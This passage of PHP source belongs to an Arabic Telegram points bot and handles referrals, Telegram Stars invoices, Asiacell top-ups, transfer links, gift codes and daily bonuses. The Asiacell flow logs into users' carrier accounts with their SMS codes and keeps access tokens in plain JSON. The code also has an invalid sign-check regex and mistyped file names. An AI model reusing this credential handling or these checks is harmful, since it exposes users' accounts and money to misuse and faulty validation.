$price = str_replace('#orders_count', $rshq["tlby"][$from_id] ?? 0, $price);
$price = str_replace('#bot_orders', $rshq['bot_tlb'] ?? 0, $price);
$price = str_replace('#invites', $rshq["mshark"][$from_id] ?? 0, $price);
$price = str_replace('#invite_points', $rshq["coinshare"] ?? 25, $price);
$invite_link = "[https://t.me/".$usrbot."?start=$from_id]";
$price = str_replace('#invite_link', $invite_link, $price);
$top_invites = "";
$joo_DATA = getData($db, 'joo_data', 'joo');
if($joo_DATA && isset($joo_DATA['joo']['send']['uname'])){
$send_uname = $joo_DATA['joo']['send']['uname'];
$send_add = $joo_DATA['joo']['send']['add'];
$top_data = [];
for($i=0;$i<count($send_uname);$i++){
$top_data[] = ['user_id' => $send_uname[$i], 'count' => $send_add[$i]];
}
usort($top_data, function($a, $b){return $b['count'] - $a['count'];});
$top_list = "";
for($i=0;$i<min(5,count($top_data));$i++){
$rank = $i+1;
$rank_emoji = $rank == 1 ? "🥇" : ($rank == 2 ? "🥈" : ($rank == 3 ? "🥉" : ($rank == 4 ? "🏅" : "🏅")));
$user_info = bot('getChat',['chat_id'=>$top_data[$i]['user_id']]);
$user_name = $user_info->result->first_name ?? $top_data[$i]['user_id'];
$top_list .= "$rank_emoji $user_name - {$top_data[$i]['count']} دعوة\n";
}
$price = str_replace('#top_invites', $top_list, $price);
} else {
$price = str_replace('#top_invites', "لا توجد بيانات", $price);
}
$price = str_replace('#funding_count', count($tmoil['db']['chs'] ?? []), $price);
$funding_channels_list = "";
if(isset($tmoil['db']['chs']) && !empty($tmoil['db']['chs'])){
foreach($tmoil['db']['chs'] as $chs){
$funding_channels_list .= "- @$chs\n";
}
} else {
$funding_channels_list = "لا توجد قنوات تحت التمويل";
}
$price = str_replace('#funding_channels', $funding_channels_list, $price);
$currency_name = $rshq['currency'] ?? 'نقاط';
$price = str_replace('#currency', $currency_name, $price);
$Type = $joo_azrar['joos'][$data]['Type'] ?? "EditMessageText";
$color = $joo_azrar['joos'][$data]['color'] ?? "default";
if($color == "default"){$color = "primary";}
$emoji = $joo_azrar['joos'][$data]['emoji'] ?? null;
if($Type == "EditMessageText"){
if($emoji){
$reply_p = json_encode(['inline_keyboard' => [[['text'=>"رجوع",'callback_data'=>"tobot",'style'=>$color,'icon_custom_emoji_id'=>$emoji]]]]);
} else {
$reply_p = json_encode(['inline_keyboard' => [[['text'=>"رجوع",'callback_data'=>"tobot",'style'=>$color]]]]);
}
} else {
$reply_p = null;
}
bot($Type,[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>$price,
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>$reply_p,
]);
exit;
}

/*if($data == "tobot") {
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>$start_msg,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode($Rjoo)
]);
}*/
if($data == "buy") {
if($rshq['buy'] == null){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"• لم يتم التعيين",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"شحن آسياسيل ",'callback_data'=>"asia_charge_user","style" => "success","icon_custom_emoji_id" => "5334665620074017921"]],
[['text'=>"شحن نجوم ",'callback_data'=>"stars_charge_user","style" => "success","icon_custom_emoji_id" => "5951700382961898593"]],
[['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
} else {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>$rshq['buy'],
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"شحن آسياسيل ",'callback_data'=>"asia_charge_user","style" => "success","icon_custom_emoji_id" => "5334665620074017921"]],
[['text'=>"شحن نجوم ",'callback_data'=>"stars_charge_user","style" => "success","icon_custom_emoji_id" => "5951700382961898593"]],
[['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
}
}
if($data == "buy"){ 
    
    $rshq['stars_step'][$from_id] = null;
    $rshq['asia_step'][$from_id] = null;
    SETJSON($rshq);
}

if($data == "stars_charge_user"){
    $status = $rshq['stars_settings']['status'] ?? 'on';
    if($status == "off"){
        bot('EditMessageText',['chat_id'=>$chat_id,'message_id'=>$message_id,'text'=>"❌ *نظام الشحن بالنجوم مغلق حالياً من قبل الإدارة.*",'parse_mode'=>'markdown','reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"رجوع ⬅️",'callback_data'=>"buy"]]]])]);
        exit;
    }
    
    
    $min_stars = $rshq['stars_settings']['min'] ?? 1;
    $max_stars = $rshq['stars_settings']['max'] ?? 1000;
    $points_per_star = $rshq['stars_settings']['points_per_star'] ?? 10;
    
    bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"⭐ *الشحن عبر نجوم تيليجرام*\n\n💰 سعر النجمة: `$points_per_star` $currency_name\n🔽 الحد الأدنى للشراء: `$min_stars` نجمة\n🔼 الحد الأقصى للشراء: `$max_stars` نجمة\n\n📌 *أرسل الآن عدد ( النجوم ) التي تريد شراءها بالأرقام:*",
        'parse_mode'=>'markdown',
        'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"إلغاء ورجوع ⬅️",'callback_data'=>"buy"]]]])
    ]);
    $rshq['stars_step'][$from_id] = "waiting_stars_amount";
    SETJSON($rshq);
    exit;
}

if($text && ($rshq['stars_step'][$from_id] ?? '') == "waiting_stars_amount" && is_numeric($text)){
    $stars_needed = (int)$text; 
    

    $min_stars = $rshq['stars_settings']['min'] ?? 1;
    $max_stars = $rshq['stars_settings']['max'] ?? 1000;
    $points_per_star = $rshq['stars_settings']['points_per_star'] ?? 10;
    
    if($stars_needed < $min_stars || $stars_needed > $max_stars){
        bot('sendMessage',[
            'chat_id'=>$chat_id,
            'text'=>"⚠️ *عذراً، الكمية غير مقبولة!*\n\nالكمية يجب أن تكون بين `$min_stars` و `$max_stars` نجمة.\nيرجى إرسال كمية صحيحة:",
            'parse_mode'=>'markdown',
            'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"إلغاء ورجوع ⬅️",'callback_data'=>"buy"]]]])
        ]);
        exit;
    }
    
    
    $points_earned = $stars_needed * $points_per_star;
    
    if(!isset($rshq['stars_stats'])) $rshq['stars_stats'] = ['attempts'=>0, 'users_attempted'=>[], 'completed'=>0, 'users_completed'=>[], 'total_stars'=>0];
    $rshq['stars_stats']['attempts']++;
    if(!in_array($from_id, $rshq['stars_stats']['users_attempted'])) $rshq['stars_stats']['users_attempted'][] = $from_id;
    
    $rshq['stars_step'][$from_id] = null;
    SETJSON($rshq);
    
    
    $invoice_desc = "🛍 تفاصيل عملية الشحن:\n\n"
                  . "💎 الرصيد المكتسب: $points_earned $currency_name\n"
                  . "⭐ التكلفة الإجمالية: $stars_needed نجمة\n"
                  . "📊 معدل التحويل: 1 نجمة = $points_per_star $currency_name\n\n"
                  . "👇 اضغط على زر الدفع بالأسفل لإتمام العملية.";
    
    bot('sendInvoice',[
        'chat_id'=>$chat_id,
        'title'=>"شحن رصيد 🚀",
        'description'=>$invoice_desc,
        'payload'=>"stars_payment|$points_earned|$stars_needed",
        'provider_token'=>"",
        'currency'=>"XTR",
        'prices'=>json_encode([['label'=>"دفع $stars_needed نجمة ⭐",'amount'=>$stars_needed]]),
        'start_parameter'=>"stars_pay"
    ]);
    exit;
}

if(isset($update->pre_checkout_query)){
    bot('answerPreCheckoutQuery',['pre_checkout_query_id'=>$update->pre_checkout_query->id,'ok'=>true]);
    exit;
}

if(isset($update->message->successful_payment)){
    $payload = $update->message->successful_payment->invoice_payload;
    $parts = explode("|", $payload);
    $points = $parts[1] ?? 0;
    $stars = $parts[2] ?? 0;
    
    $rshq["coin"][$from_id] = ($rshq["coin"][$from_id] ?? 0) + $points;
    
    $rshq['stars_stats']['completed']++;
    $rshq['stars_stats']['total_stars'] += $stars;
    if(!in_array($from_id, $rshq['stars_stats']['users_completed'])) $rshq['stars_stats']['users_completed'][] = $from_id;
    
    SETJSON($rshq);
    
    bot('sendMessage',['chat_id'=>$chat_id,'text'=>"✅ *عملية ناجحة!*\n\nتم إضافة `$points` $currency_name إلى رصيدك بنجاح.\n🌟 عدد النجوم المدفوعة: `$stars` نجمة.", 'parse_mode'=>'markdown']);
    bot('sendMessage',['chat_id'=>$joo,'text'=>"🛍 *عملية شحن بالنجوم جديدة!*\n\nالمستخدم: [$name](tg://user?id=$from_id)\nالايدي: `$from_id`\nالنقاط المضافة: `$points`\nالنجوم المدفوعة: `$stars`", 'parse_mode'=>'markdown']);
    exit;
}



if($data == "asia_charge_user"){
    $status = $rshq['asia_settings']['status'] ?? 'on';
    if($status == "off"){
        bot('EditMessageText',['chat_id'=>$chat_id,'message_id'=>$message_id,'text'=>"❌ *نظام الشحن عبر آسياسيل مغلق حالياً من قبل الإدارة.*",'parse_mode'=>'markdown','reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"رجوع ⬅️",'callback_data'=>"buy"]]]])]);
        exit;
    }
    $points_per_asia = $rshq['asia_settings']['points_per_asia'] ?? 1;
    $min = $rshq['asia_settings']['min'] ?? 1;
    $max = $rshq['asia_settings']['max'] ?? 60;
    
    bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"🔴 *الشحن عبر آسياسيل*\n\n💰 سعر النقاط: `$points_per_asia` $currency_name لكل دينار\n🔽 الحد الأدنى للشحن: `$min`\n🔼 الحد الأقصى للشحن: `$max`\n\n📱 *أرسل رقم هاتفك للبدء (يجب أن يبدأ بـ 077):*",
        'parse_mode'=>'markdown',
        'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"رجوع ⬅️",'callback_data'=>"buy"]]]])
    ]);
    $rshq['asia_step'][$from_id] = "waiting_phone";
    SETJSON($rshq);
    exit;
}

if($text && ($rshq['asia_step'][$from_id] ?? '') == "waiting_phone" && is_numeric($text) && strlen($text) >= 10){
    $deviceInfo = ['DeviceID' => 'afa89b0b-23d5-40d5-8494-a0e297afd291'];
    $result = LoginDB($text, $deviceInfo);
    if($result['success']){
        $rshq['asia_temp'][$from_id] = ['step' => 'waiting_code', 'phone' => $text, 'PID' => $result['PID'], 'deviceInfo' => $deviceInfo];
        SETJSON($rshq);
        bot('sendMessage',[
            'chat_id'=>$chat_id,
            'text'=>"📩 تم إرسال كود التحقق إلى رقمك ($text).\n📌 أرسل الكود الآن:",
            'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"🔙 إلغاء ورجوع",'callback_data'=>"buy"]]]])
        ]);
    } else {
        bot('sendMessage',[
            'chat_id'=>$chat_id,
            'text'=>"❌ فشل إرسال كود التحقق، تأكد من الرقم وأعد المحاولة.",
            'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"🔙 إلغاء ورجوع",'callback_data'=>"buy"]]]])
        ]);
    }
    exit;
}

if($text && isset($rshq['asia_temp'][$from_id]['step']) && $rshq['asia_temp'][$from_id]['step'] == 'waiting_code' && is_numeric($text)){
    $temp = $rshq['asia_temp'][$from_id];
    $result = pass($text, $temp['PID'], $temp['deviceInfo']);
    if($result['success']){
        $rshq['asia_session'][$from_id] = ['phone' => $temp['phone'], 'access_token' => $result['access_token'], 'fullname' => $result['fullname']];
        unset($rshq['asia_temp'][$from_id]);
        $rshq['asia_step'][$from_id] = "waiting_amount";
        SETJSON($rshq);
        bot('sendMessage',[
            'chat_id'=>$chat_id,
            'text'=>"✅ تم تسجيل الدخول بنجاح.\n\n💰 أرسل المبلغ الذي تريد تحويله الآن بالآسياسيل:",
            'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"🔙 إلغاء ورجوع",'callback_data'=>"buy"]]]])
        ]);
    } else {
        bot('sendMessage',[
            'chat_id'=>$chat_id,
            'text'=>"❌ كود غير صحيح!",
            'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"🔙 إلغاء ورجوع",'callback_data'=>"buy"]]]])
        ]);
    }
    exit;
}

if($text && ($rshq['asia_step'][$from_id] ?? '') == "waiting_amount" && is_numeric($text)){
    $min = $rshq['asia_settings']['min'] ?? 1;
    $max = $rshq['asia_settings']['max'] ?? 60;
    
    if($text < $min || $text > $max){
        bot('sendMessage',['chat_id'=>$chat_id,'text'=>"⚠️ عذراً، المبلغ يجب أن يكون بين `$min` و `$max` آسياسيل.",'parse_mode'=>'markdown']);
        exit;
    }
    
    if(!isset($rshq['asia_session'][$from_id])){
        bot('sendMessage',['chat_id'=>$chat_id,'text'=>"❌ انتهت الجلسة، يرجى إعادة المحاولة من البداية."]);
        $rshq['asia_step'][$from_id] = null;
        SETJSON($rshq);
        exit;
    }
    
    $session = $rshq['asia_session'][$from_id];
    $points = $text * ($rshq['asia_settings']['points_per_asia'] ?? 1);
    $receive_number = $rshq['asia_settings']['receive_number'] ?? '';
    
    if(!isset($rshq['asia_stats'])) $rshq['asia_stats'] = ['attempts'=>0, 'users_attempted'=>[], 'completed'=>0, 'users_completed'=>[], 'total_iqd'=>0, 'total_points'=>0];
    $rshq['asia_stats']['attempts']++;
    if(!in_array($from_id, $rshq['asia_stats']['users_attempted'])) $rshq['asia_stats']['users_attempted'][] = $from_id;
    SETJSON($rshq);

    $result = Tran($session['access_token'], $text, $receive_number, ['DeviceID' => 'afa89b0b-23d5-40d5-8494-a0e297afd291']);
    if($result['success']){
        $rshq['asia_temp'][$from_id] = ['step' => 'waiting_transfer_code', 'amount' => $text, 'points' => $points, 'PID' => $result['PID']];
        $rshq['asia_step'][$from_id] = null;
        SETJSON($rshq);
        bot('sendMessage',['chat_id'=>$chat_id,'text'=>"✅ تم إرسال كود تأكيد التحويل لخطك.\n✉️ أرسل الكود الآن لإتمام العملية بنجاح:"]);
    } else {
        $fail_msg = "❌ فشل إرسال طلب التحويل، يرجى التأكد من رصيدك أو المحاولة لاحقاً.";
        if(($rshq['asia_settings']['fail_notif'] ?? 'on') == 'on'){
            bot('sendMessage',['chat_id'=>$chat_id,'text'=>"⚠️ *إشعار فشل العملية*\n\n$fail_msg", 'parse_mode'=>'markdown']);
        } else {
            bot('sendMessage',['chat_id'=>$chat_id,'text'=>$fail_msg]);
        }
    }
    exit;
}

if($text && isset($rshq['asia_temp'][$from_id]['step']) && $rshq['asia_temp'][$from_id]['step'] == 'waiting_transfer_code'){
    $temp = $rshq['asia_temp'][$from_id];
    $session = $rshq['asia_session'][$from_id];
    $result = Check($session['access_token'], $temp['PID'], $text, ['DeviceID' => 'afa89b0b-23d5-40d5-8494-a0e297afd291']);
    
    if($result['success']){
        $rshq["coin"][$from_id] = ($rshq["coin"][$from_id] ?? 0) + $temp['points'];
        
        $rshq['asia_stats']['completed']++;
        $rshq['asia_stats']['total_iqd'] += $temp['amount'];
        $rshq['asia_stats']['total_points'] += $temp['points'];
        if(!in_array($from_id, $rshq['asia_stats']['users_completed'])) $rshq['asia_stats']['users_completed'][] = $from_id;
        
        if(($rshq['asia_settings']['success_notif'] ?? 'on') == 'on'){
            bot('sendMessage',['chat_id'=>$chat_id,'text'=>"🎉 *إشعار نجاح الدفع*\n\n✅ تمت العملية بنجاح.\n💰 المبلغ المخصوم: `{$temp['amount']}` آسياسيل\n⭐ النقاط المضافة: `{$temp['points']}` $currency_name\n\nرصيدك الحالي: `{$rshq['coin'][$from_id]}` $currency_name", 'parse_mode'=>'markdown']);
        } else {
            bot('sendMessage',['chat_id'=>$chat_id,'text'=>"✅ تم إضافة {$temp['points']} $currency_name إلى حسابك بنجاح!"]);
        }
        
        bot('sendMessage',['chat_id'=>$joo,'text'=>"📢 *عملية شحن آسياسيل ناجحة!*\n\n👤 المستخدم: [$name](tg://user?id=$from_id)\n🆔 الايدي: `$from_id`\n💵 المبلغ: `{$temp['amount']}` آسياسيل\n⭐ النقاط المضافة: `{$temp['points']}`\n💰 رصيده الحالي: `{$rshq['coin'][$from_id]}` $currency_name", 'parse_mode'=>'markdown']);
    } else {
        $fail_msg = "❌ الكود غير صحيح أو انتهت صلاحيته.";
        if(($rshq['asia_settings']['fail_notif'] ?? 'on') == 'on'){
            bot('sendMessage',['chat_id'=>$chat_id,'text'=>"⚠️ *إشعار فشل العملية*\n\n$fail_msg", 'parse_mode'=>'markdown']);
        } else {
            bot('sendMessage',['chat_id'=>$chat_id,'text'=>$fail_msg]);
        }
    }
    unset($rshq['asia_temp'][$from_id]);
    unset($rshq['asia_session'][$from_id]);
    $rshq['asia_step'][$from_id] = null;
    SETJSON($rshq);
    exit;
}

if($data == "hdia") {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"![🏷](tg://emoji?id=5445353829304387411) ارسل الكود :
",
'parse_mode'=>"markdownV2",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
$rshq['mode'][$from_id]= "hdia";
SETJSON($rshq);
}
if($data == "transer") {
if($rshq['transfer_status'] == "off"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*تحويل النقاط مغلق حاليا ❌
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
}else{
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"ارسل عدد الرصيد لتحويله ![🌀](tg://emoji?id=5854722989240619332) 
",
'parse_mode'=>"markdownV2",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
$rshq['mode'][$from_id]= $data;
SETJSON($rshq);
}
}
$MakLink = substr(str_shuffle('AbCdEfGhIjKlMnOpQrStU12345689807'),1,13);
if(is_numeric($text) and $rshq['mode'][$from_id] == "transer") {
if($rshq["coin"][$from_id] >= $text) {
if(!preg_match('/+/',$text) or !preg_match('/-/',$text) ){
$min_transfer_amount = $rshq['min_transfer'] ?? 10;
if($text >= $min_transfer_amount) {
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"🛍- تم صنع رابط تحويل بقيمه $text $currency_name 
 
♻️- وتم استقطاع *$text* $currency_name من رصيدك 

📦- الرابط : https://t.me/". bot('getme','bot')->result->username. "?start=kilwa$MakLink

📋- ايدي وصل التحويل : `$MakLink`

💰- عدد رصيدك : *". $rshq["coin"][$from_id]. "* $currency_name
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
$rshq["coin"][$from_id] -= $text;
$rshq['mode'][$from_id]= null;
$rshq['thoiler'][$MakLink]["coin"] = $text;
$rshq['thoiler'][$MakLink]["to"] = $from_id;
SETJSON($rshq);
}
else
{
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"يمكنك تحويل رصيد اكثر من $min_transfer_amount $currency_name فقط
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
}
}
} else {
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"رصيدك غير كافيه ❌
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
}
}
if($text and $rshq['mode'][$from_id] == "hdia") {
if(explode("|", $rshq[$text])[0] == "on") {
if($rshq['mehdia'][$from_id][$text] !="on" ) {
if(explode("|", $rshq[$text])[2] >= $rshq["TASY_$text"]){
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"🌀- تم اضافة ". explode("|", $rshq[$text])[1]." $currency_name الى حسابك 🎁
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
bot('sendMessage',[
 'chat_id'=>$joo,
 'text'=>"شخص اخذ كود الرصيد: 
 
- القيمه: ".explode("|", $rshq[$text])[1]." $currency_name
- الشخص: [$name](tg://user?id=$chat_id)
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
$rshq["TASY_$text"] +=1;
$rshq['mode'][$from_id] = null;
$rshq['mehdia'][$from_id][$text] = "on" ;
$rshq["coin"][$from_id] += explode("|", $rshq[$text])[1];
SETJSON($rshq);
} else {
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"الكود خطأ او تم استخدامه ❌
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
} else {
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"الكود خطأ او تم استخدامه ❌
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
}
} else {
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"الكود خطأ او تم استخدامه ❌
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}
}
if($data == "plus") {
if($HDIAS) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*• اهلا بك عزيزي المستخدم في قسم تجميع الرصيد مجاني:* ![🛒](tg://emoji?id=4965219701572503640)

*• يمكنك جميع الرصيد بدون شراء وبدون تعب عن طريق الخدمات التاليه:*  ![🎉](tg://emoji?id=5461151367559141950)
*• اختر ما تريد من الاسفل ![📭](tg://emoji?id=5231012545799666522):* ",
'parse_mode'=>"markdownV2",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
[['text'=>"رابط الدعوه ",'callback_data'=>"linkme","style" => "primary","icon_custom_emoji_id" => "5447410659077661506"],['text'=>"$HDIAS",'callback_data'=>"hdiaa","style" => "primary","icon_custom_emoji_id" => "5850323366476519158"]],
[['text' => " الاشتراك في القنوات", 'callback_data' => "joins|1","style" => "primary","icon_custom_emoji_id" => "6008220984346152956"]], 
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
} else {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*• اهلا بك عزيزي المستخدم في قسم تجميع الرصيد مجاني:* ![🛒](tg://emoji?id=4965219701572503640)

*• يمكنك جميع الرصيد بدون شراء وبدون تعب عن طريق الخدمات التاليه:*  ![🎉](tg://emoji?id=5461151367559141950)
*• اختر ما تريد من الاسفل ![📭](tg://emoji?id=5231012545799666522):* ",
'parse_mode'=>"markdownV2",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
[['text'=>"رابط الدعوه ",'callback_data'=>"linkme","style" => "primary","icon_custom_emoji_id" => "5447410659077661506"],['text'=>"",'callback_data'=>"hdiaa","style" => "primary","icon_custom_emoji_id" => "5850323366476519158"]],
[['text' => " الاشتراك في القنوات", 'callback_data' => "joins|1","style" => "primary","icon_custom_emoji_id" => "6008220984346152956"]], 
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
}
}
$joo_azrar = getData($db, 'joo_data', 'joo');
if(!$joo) $joo = [];
$f= $joo_azrar['joo']['send']['add'];
rsort($f);
$ok = "";
for($i=0;$i<5;$i++){
if($f[$i] != null){
$V = array_search($f[$i],$joo_azrar['joo']['send']['add']);
$uS = $joo_azrar['joo']['send']['uname'][$V];
$u=$i+1;
$Numbers = array('1','2','3','4','5');
$NumbersBe = array('🥇','🥈','🥉','🏅','🏅');
$u = str_replace($Numbers,$NumbersBe,$u);
$dh=bot("getchat",['chat_id'=>$uS])->result->title;
if($dh != null) {
$fk = $dh;
}
if($dh == null) {
$fk = $uS;
}
$ok = $ok .= " $u ) ❲<b>$f[$i]</b>❳ -> <a href='tg://user?id=$uS'>$fk</a>\n";
}
}
$bot_username = bot("getMe")->result->username;
$link = "https://t.me/$bot_username?start=$from_id";

$b="<tg-emoji emoji-id=\"5375338737028841420\">📬</tg-emoji>- الاعلى في الدعوات : \n$ok" ;
if($data == "linkme") {
$sx = ($rshq["coinshare"]?? "25");
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"<b>• اهلا بك في قسم رابط الدعوه الخالص بك <tg-emoji emoji-id=\"5447410659077661506\">🌐</tg-emoji>
----------------------------
- شارك رابط الدعوه واحصل علي رصيد بشكل مجاني <tg-emoji emoji-id=\"5278495204553282572\">🎁</tg-emoji>

• عدد دعولتك : $share <tg-emoji emoji-id=\"5895407084131848348\">👤</tg-emoji>
• رصيد الدعوه: $sx $currency_name <tg-emoji emoji-id=\"5280943438991214029\">🛍</tg-emoji>

- الرابط الخاص بك <tg-emoji emoji-id=\"5854722989240619332\">🌀</tg-emoji> :
https://t.me/".bot("getme")->result->username."?start=$from_id

----------------------------</b>
$b
",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
[[ 'text' => " نسخ الرابط", 'copy_text' => ['text' =>$link], 'icon_custom_emoji_id' => "5397916757333654639"]], 
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
}
$d = date('D');
$day = explode("\n",file_get_contents($d."_".USR_BOT.".txt"));
if($d == "Sat"){
unlink("Fri_$usrbot.txt");
}
if($d == "Sun"){
unlink("Sat_".USR_BOT.".txt");
}
if($d == "Mon"){
unlink("Sun_".USR_BOT.".txt");
}
if($d == "Tue"){
unlink("Mon_".USR_BOT.".txt");
}
if($d == "Wed"){
unlink("The_".USR_BOT.".txt");
}
if($d == "Thu"){
unlink("Wedtxt");
}
if($d == "Fri"){
unlink("Thu_".USR_BOT.".txt");
}
if($data == "hdiaa"){
if(!in_array($from_id, $day)){
$HDIASs = ($rshq['hdias'] ?? "20");
bot('answercallbackquery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"🎁 لقد حصلت علي $HDIASs $currency_name 🎁",
 'show_alert'=>true,
]);
$coin = $coin + $HDIASs;
$hour = explode (".",(strtotime('tomorrow') - time()) / (60 * 60))[0];
 file_put_contents($d."_".USR_BOT.".txt",$from_id."\n",FILE_APPEND);
 $rshq["coin"][$from_id] += $HDIASs;
 SETJSON($rshq);
}else{
$hour = explode (".",(strtotime('tomorrow') - time()) / (60 * 60))[0];
bot('answercallbackquery',[
'callback_query_id'=>$update->callback_query->id,
 'text' =>"- اليوميه بعد $hour ساعه 🌀
 ",
'show_alert'=>true,
]);
}
}
if($data == "acc") {
$hour = explode(".", (strtotime('tomorrow') - time()) / (60 * 60))[0];
if(!in_array($from_id, $day)){
$hour = "تستطيع المطالبة بها 🎁";
} else {
$hour = explode(".", (strtotime('tomorrow') - time()) / (60 * 60))[0]." ساعة";
}
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"<b>• اهلا بك في قسم معلومات الحساب</b> <tg-emoji emoji-id=\"5231200819986047254\">📊</tg-emoji>

<tg-emoji emoji-id=\"5359437015752401733\">💰</tg-emoji>- رصيدك : $coin $currency_name
<tg-emoji emoji-id=\"5280943438991214029\">💎</tg-emoji>- الرصيد المستخدمة: ".($rshq["cointlb"][$from_id] ?? "0")." $currency_name
<tg-emoji emoji-id=\"5447410659077661506\">🌀</tg-emoji>- لقد دعوت: $share 
<tg-emoji emoji-id=\"5895407084131848348\">📋</tg-emoji>- عدد طلباتك: $tlby 

<tg-emoji emoji-id=\"5337080053119336309\">🗳</tg-emoji>- <b>عدد طلبات البوت: $bot_tlb</b>
",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style"=>"danger","icon_custom_emoji_id"=>"5449683594425410231"]],
]
])
]);
}
if($data == "service") {
if($rshq['rshqG'] == "on" ) {

$key = ['inline_keyboard' => []];
$row = [];

foreach ($rshq['qsm'] as $i) {

$nameq = explode("-",$i)[0];
$id = explode("-",$i)[1];

if($rshq['IFWORK>'][$id] != "NOT"){

$btn = [
'text' => "$nameq",
'callback_data' => "jooENT|$id",
"style" => "primary"
];

if(isset($rshq['EMOJI'][$id])){
$btn["icon_custom_emoji_id"] = $rshq['EMOJI'][$id];
}

$row[] = $btn;

if(count($row) == 2){
